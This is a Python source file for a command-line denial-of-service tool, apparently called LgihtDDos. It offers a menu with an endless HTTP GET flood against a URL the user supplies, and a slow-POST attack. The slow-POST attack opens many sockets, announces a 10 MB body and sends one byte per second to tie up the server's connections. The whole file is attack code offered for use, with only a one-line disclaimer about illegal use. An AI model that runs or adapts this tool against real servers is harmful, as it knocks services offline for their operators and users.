# -*- coding: utf-8 -*-
import requests
import threading
import logging
import socket
import time

logging.captureWarnings(True)
socks = []
logo = '''
  ~●█〓██▄▄▄▄▄▄   LgihtDDos
  ▄▅██████▅▄▃▂
 ██████████████
 ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲◤
——————-——————————————————
勿用于违法用途,编写者不承担任何责任
'''


def Hello():  # 开始文字
    print("LgihtWebPacket Version[1.0.0]")  # 项目名及版本号
    print(logo)  # 打印图标
    print("Code By WindStream,wonder")  # 作者
    print("Enter 'menu' to start")  # 菜单提示


def Menu():  # 菜单
    print("(1)AttackWebSite(GetPacket)")  # get包请求(写好了)
    print("(2)Normal Mode DDos")

    print('                   ')  # 可是这是DDos,如果是端口扫描的话我有另一个项目
    print("(99)exit")


def nonebackmessage(c):
    print("Error:'" + c + "' is not a right command.")  # 不存在的命令


def Url_Get_Attack(Myurl):
    while True:
        a = requests.get(Myurl, verify=False)
        print("Sent Packet Successful,Target Status Code --->" + str(a.status_code))


def NorMal_Mode_DDOS():
    HOST = input(">>>Target:")
    PORT = int(input(">>>Port:"))
    MAX_CONN = int(input(">>>Max_Connect:"))
    PAGE = "/index.php"
    # ---------------------------
    buf = ("POST %s HTTP/1.1\r\n"
           "Host: %s\r\n"
           "Content-Length: 10000000\r\n"
           "Cookie: dklkt_dos_test\r\n"
           "\r\n" % (PAGE, HOST))

    def conn_thread():
        global socks
        for i in range(0, MAX_CONN):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((HOST, PORT))
                s.send(buf.encode())
                print("Send buf OK!,conn=%d" % i)
                socks.append(s)
            except Exception as ex:
                print("Could not connect to server or send error:%s" % ex)
                time.sleep(10)

    # end def
    def send_thread():
        global socks
        while True:
            for s in socks:
                try:
                    s.send("f".encode())
                    # print "send OK!"
                except Exception as ex:
                    print("Send Exception:%s\n" % ex)
                    socks.remove(s)
                    s.close()
            time.sleep(1)

    # end def

    conn_th = threading.Thread(target=conn_thread, args=())
    send_th = threading.Thread(target=send_thread, args=())
    conn_th.start()
    send_th.start()


Hello()
while True:
    Command = input(">>>")
    if Command.lower() == "menu":
        Menu()
    elif Command == "1":
        Attack_Url = input(">>>Attack Url:")
        while True:
            thread1 = threading.Thread(target=Url_Get_Attack(Myurl=Attack_Url), args=('thread1',))  # 多线程发get包
            thread2 = threading.Thread(target=Url_Get_Attack(Myurl=Attack_Url), args=('thread2',))
            thread3 = threading.Thread(target=Url_Get_Attack(Myurl=Attack_Url), args=('thread3',))
            thread1.setDaemon(True)
            thread1.start()
            thread2.setDaemon(True)
            thread2.start()
            thread3.setDaemon(True)
            thread3.start()
    elif Command == "2":
        NorMal_Mode_DDOS()
    elif Command == "99":
        exit()
    else:
        print(nonebackmessage(c=Command))  # 若命令不存在返回
